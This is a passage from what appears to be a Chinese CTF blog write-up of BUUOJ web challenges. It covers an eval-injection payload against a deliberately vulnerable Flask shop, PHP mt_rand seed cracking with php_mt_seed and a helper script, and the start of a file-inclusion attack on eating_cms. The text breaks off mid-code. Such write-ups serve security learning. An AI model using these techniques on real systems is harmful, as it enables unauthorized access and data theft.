punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                event_handler <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>                    action <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token string">'_handler'</span> <span class="token keyword">if</span> is_action <span class="token keyword">else</span> <span class="token string">'_function'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                ret_val <span class="token operator">=</span> event_handler<span class="token punctuation">(</span>args<span class="token punctuation">)</span>            <span class="token keyword">except</span> RollBackException<span class="token punctuation">:</span>                <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                    resp <span class="token operator">=</span> <span class="token string">''</span>                resp <span class="token operator">+=</span> <span class="token string">'ERROR! All transactions have been cancelled. &lt;br />'</span>                resp <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;index">Go back to index.html&lt;/a>&lt;br />'</span>                session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>prev_session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span>                session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>prev_session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span>                <span class="token keyword">break</span>            <span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span>                <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                    resp <span class="token operator">=</span> <span class="token string">''</span>                <span class="token comment"># resp += str(e) # only for debugging</span>                <span class="token keyword">continue</span>            <span class="token keyword">if</span> ret_val <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                    resp <span class="token operator">=</span> ret_val                <span class="token keyword">else</span><span class="token punctuation">:</span>                    resp <span class="token operator">+=</span> ret_val    <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> resp <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>        resp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'404 NOT FOUND'</span><span class="token punctuation">,</span> <span class="token number">404</span><span class="token punctuation">)</span>    session<span class="token punctuation">.</span>modified <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> resp<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">entry_point</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    querystring <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>query_string<span class="token punctuation">)</span>    request<span class="token punctuation">.</span>event_queue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> querystring <span class="token operator">==</span> <span class="token string">''</span> <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token keyword">not</span> querystring<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'action:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token builtin">len</span><span class="token punctuation">(</span>querystring<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">:</span>        querystring <span class="token operator">=</span> <span class="token string">'action:index;False#False'</span>    <span class="token keyword">if</span> <span class="token string">'num_items'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>        session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span>        session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    request<span class="token punctuation">.</span>prev_session <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span>    trigger_event<span class="token punctuation">(</span>querystring<span class="token punctuation">)</span>    <span class="token keyword">return</span> execute_event_loop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># handlers/functions below --------------------------------------</span><span class="token keyword">def</span> <span class="token function">view_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    page <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    html <span class="token operator">=</span> <span class="token string">''</span>    html <span class="token operator">+=</span> <span class="token string">'[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br />'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>        session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> page <span class="token operator">==</span> <span class="token string">'index'</span><span class="token punctuation">:</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:index;True%23False">View source code&lt;/a>&lt;br />'</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;shop">Go to e-shop&lt;/a>&lt;br />'</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;reset">Reset&lt;/a>&lt;br />'</span>    <span class="token keyword">elif</span> page <span class="token operator">==</span> <span class="token string">'shop'</span><span class="token punctuation">:</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:buy;1">Buy a diamond (1 point)&lt;/a>&lt;br />'</span>    <span class="token keyword">elif</span> page <span class="token operator">==</span> <span class="token string">'reset'</span><span class="token punctuation">:</span>        <span class="token keyword">del</span> session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span>        html <span class="token operator">+=</span> <span class="token string">'Session reset.&lt;br />'</span>    html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;index">Go back to index.html&lt;/a>&lt;br />'</span>    <span class="token keyword">return</span> html<span class="token keyword">def</span> <span class="token function">index_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    bool_show_source <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    bool_download_source <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> bool_show_source <span class="token operator">==</span> <span class="token string">'True'</span><span class="token punctuation">:</span>        source <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'eventLoop.py'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>        html <span class="token operator">=</span> <span class="token string">''</span>        <span class="token keyword">if</span> bool_download_source <span class="token operator">!=</span> <span class="token string">'True'</span><span class="token punctuation">:</span>            html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:index;True%23True">Download this .py file&lt;/a>&lt;br />'</span>            html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;index">Go back to index.html&lt;/a>&lt;br />'</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> source<span class="token punctuation">:</span>            <span class="token keyword">if</span> bool_download_source <span class="token operator">!=</span> <span class="token string">'True'</span><span class="token punctuation">:</span>                html <span class="token operator">+=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;amp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'&amp;nbsp;'</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>                    <span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'&amp;nbsp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'&amp;gt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">'&lt;br />'</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                html <span class="token operator">+=</span> line        source<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> bool_download_source <span class="token operator">==</span> <span class="token string">'True'</span><span class="token punctuation">:</span>            headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>            headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'text/plain'</span>            headers<span class="token punctuation">[</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'attachment; filename=serve.py'</span>            <span class="token keyword">return</span> Response<span class="token punctuation">(</span>html<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> html    <span class="token keyword">else</span><span class="token punctuation">:</span>        trigger_event<span class="token punctuation">(</span><span class="token string">'action:view;index'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">buy_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    num_items <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> num_items <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br />'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">+=</span> num_items    trigger_event<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'func:consume_point;&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>        num_items<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'action:view;index'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">consume_point_function</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    point_to_consume <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> point_to_consume<span class="token punctuation">:</span>        <span class="token keyword">raise</span> RollBackException<span class="token punctuation">(</span><span class="token punctuation">)</span>    session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">-=</span> point_to_consume<span class="token keyword">def</span> <span class="token function">show_flag_function</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token comment"># return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span>    <span class="token keyword">return</span> <span class="token string">'You naughty boy! ;) &lt;br />'</span><span class="token keyword">def</span> <span class="token function">get_flag_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">5</span><span class="token punctuation">:</span>        <span class="token comment"># show_flag_function has been disabled, no worries</span>        trigger_event<span class="token punctuation">(</span><span class="token string">'func:show_flag;'</span> <span class="token operator">+</span> FLAG<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    trigger_event<span class="token punctuation">(</span><span class="token string">'action:view;index'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span></code></pre><p>题目中有flask，网站内容和购买有关，盲猜flask session逻辑漏洞</p><img src="/article/Buuoj-WEB-Write-up/image-20201129174627993.png" class="" title="image-20201129174627993" loading="lazy"><p>拿去<code>flask_session_cookie_manager</code>解密</p><img src="/article/Buuoj-WEB-Write-up/image-20201129174747409.png" class="" title="image-20201129174747409" loading="lazy"><p><code>&#123;&quot;log&quot;:[&#123;&quot; b&quot;:&quot;YWN0aW9uOnZpZXc7aW5kZXg=&quot;&#125;,&#123;&quot; b&quot;:&quot;YWN0aW9uOnZpZXc7aW5kZXg=&quot;&#125;],&quot;num_items&quot;:0,&quot;points&quot;:3&#125;</code></p><p>base64再解密得</p><p><code>&#123;&quot;log&quot;:[&#123;&quot; b&quot;:&quot;action:view;index&quot;&#125;,&#123;&quot; b&quot;:&quot;action:view;index&quot;&#125;],&quot;num_items&quot;:0,&quot;points&quot;:3&#125;</code></p><p>分析serve.py</p><p>先找flag</p><img src="/article/Buuoj-WEB-Write-up/image-20201129175323407.png" class="" title="image-20201129175323407" loading="lazy"><p>发现在get_flag_handler函数里，而条件是<code>session[&#39;num_items&#39;] &gt;= 5</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201129175427470.png" class="" title="image-20201129175427470" loading="lazy"><p>再跳到buy_handler函数里</p><img src="/article/Buuoj-WEB-Write-up/image-20201129175938047.png" class="" title="image-20201129175938047" loading="lazy"><p>关键逻辑</p><p><strong>num_items数目先增，然后再扣point，如果point不够再把num_items扣回去</strong></p><p>然后就不会了</p><p>开始分析大佬的WP</p><ul><li><p>仔细分析execute_event_loop，会发现里面有一个eval函数，而且是可控的！ </p></li><li><p>利用eval()可以导致任意命令执行，使用注释符可以 bypass 掉后面的拼接部分。 </p></li><li><p>若让eval()去执行trigger_event()，并且在后面跟两个命令作为参数，分别是buy和get_flag，那么buy和get_flag便先后进入队列。 </p></li><li><p>根据顺序会先执行buy_handler()，此时consume_point进入队列，排在get_flag之后，我们的目标达成。</p></li></ul><p>最终payload：</p><pre class="language-none"><code class="language-none">action:trigger_event%23;action:buy;5%23action:get_flag;</code></pre><p>不知道编码问题？<code>#</code>必须写成 <code>%23</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201129181046007.png" class="" title="image-20201129181046007" loading="lazy"><p>拿去解密得</p><img src="/article/Buuoj-WEB-Write-up/image-20201129181142945.png" class="" title="image-20201129181142945" loading="lazy"><p>base64解密得</p><pre class="language-none"><code class="language-none">&#123;&quot;log&quot;:[&#123;&quot; b&quot;:&quot;action:trigger_event#;action:buy;5#action:get_flag;&quot;&#125;,[&#123;&quot; b&quot;:&quot;action:buy;5&quot;&#125;,&#123;&quot; b&quot;:&quot;action:get_flag;&quot;&#125;],[&#123;&quot; b&quot;:&quot;func:consume_point;5&quot;&#125;,&#123;&quot; b&quot;:&quot;action:view;index&quot;&#125;],&#123;&quot; b&quot;:&quot;func:show_flag;flag&#123;f0c04d65-ffa9-472b-9263-1e308ad45fd8&#125;&quot;&#125;,&#123;&quot; b&quot;:&quot;action:view;index&quot;&#125;],&quot;num_items&quot;:0,&quot;points&quot;:3&#125;&#96;</code></pre><p>flag即在其中</p><hr><h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><img src="/article/Buuoj-WEB-Write-up/image-20201129181539620.png" class="" title="image-20201129181539620" loading="lazy"><p>看源码有个hidden标签，直接去掉得到源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">#这不是抽奖程序的源代码！不许看！</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'seed'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">999999999</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str_long1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><span class="token punctuation">;</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$len1</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len1</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$str</span><span class="token operator">.=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span><span class="token variable">$str_show</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p id='p1'>"</span><span class="token operator">.</span><span class="token variable">$str_show</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/p>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>x        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p id=flag>抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p id=flag>没抽中哦，再试试吧&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"check.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>php伪随机数爆破</p><p>用php_mt_seed</p><p>扔虚拟机里make</p><img src="/article/Buuoj-WEB-Write-up/image-20201129183233275.png" class="" title="image-20201129183233275" loading="lazy"><p>然后用python脚本转化得到的数据</p><pre class="language-python" data-language="python"><code class="language-python">str1<span class="token operator">=</span><span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>str2<span class="token operator">=</span><span class="token string">'uG8C1Wg91B'</span>str3 <span class="token operator">=</span> str1<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>     <span class="token comment"># reverse</span>length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span>    <span class="token comment"># 10</span>res<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> str2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> str1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>            res<span class="token operator">+=</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span><span class="token string">'0'</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span>            <span class="token keyword">break</span><span class="token keyword">print</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span></code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201129184300244.png" class="" title="image-20201129184300244" loading="lazy"><p>然后运行<code>./php_mt_seed 54 54 0 61 45 45 0 61 54 54 0 61 7 7 0 61 59 59 0 61 35 35 0 61 4 4 0 61 15 15 0 61 53 53 0 61 40 40 0 61</code></p><p>爆破得<code>394409044</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201129184626939.png" class="" title="image-20201129184626939" loading="lazy"><p>回去跑出完整字符串</p><img src="/article/Buuoj-WEB-Write-up/image-20201129184942098.png" class="" title="image-20201129184942098" loading="lazy"><p><code>SJShX9epREbTBLfdc4Gu</code></p><p>回去提交出flag</p><img src="/article/Buuoj-WEB-Write-up/image-20201129185017278.png" class="" title="image-20201129185017278" loading="lazy"><hr><h2 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h2><p>打开就是登陆界面</p><img src="/article/Buuoj-WEB-Write-up/image-20201129203609192.png" class="" title="image-20201129203609192" loading="lazy"><p>猜想SQL注入，发现过滤引号，暂时放弃这条路</p><img src="/article/Buuoj-WEB-Write-up/image-20201129203656135.png" class="" title="image-20201129203656135" loading="lazy"><p>不给扫目录，盲猜访问<code>register.php</code>，还真有</p><p>注册用户登陆进去</p><img src="/article/Buuoj-WEB-Write-up/image-20201129203815847.png" class="" title="image-20201129203815847" loading="lazy"><p>发现url猫腻，文件包含，利用伪协议读取一下index</p><img src="/article/Buuoj-WEB-Write-up/image-20201129203901945.png" class="" title="image-20201129203901945" loading="lazy"><pre class="language-none"><code class="language-none">PD9waHAKcmVxdWlyZV9vbmNlICJmdW5jdGlvbi5waHAiOwppZihpc3NldCgkX1NFU1NJT05bJ2xvZ2luJ10gKSl7CiAgICBIZWFkZXIoIkxvY2F0aW9uOiB1c2VyLnBocD9wYWdlPWluZm8iKTsKfQplbHNlewogICAgaW5jbHVkZSAidGVtcGxhdGVzL2luZGV4Lmh0bWwiOwp9Cj8+</code></pre><p>解密得index.php源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span> <span class="token string double-quoted-string">"function.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: user.php?page=info"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">include</span> <span class="token string double-quoted-string">"templates/index.html"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>再读一下user.php</p><p><code>user.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"function.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'isadmin'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$oper_you_can_do</span> <span class="token operator">=</span> <span class="token variable">$OPERATE_admin</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$oper_you_can_do</span> <span class="token operator">=</span> <span class="token variable">$OPERATE</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//die($_SESSION['isadmin']);</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'isadmin'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token 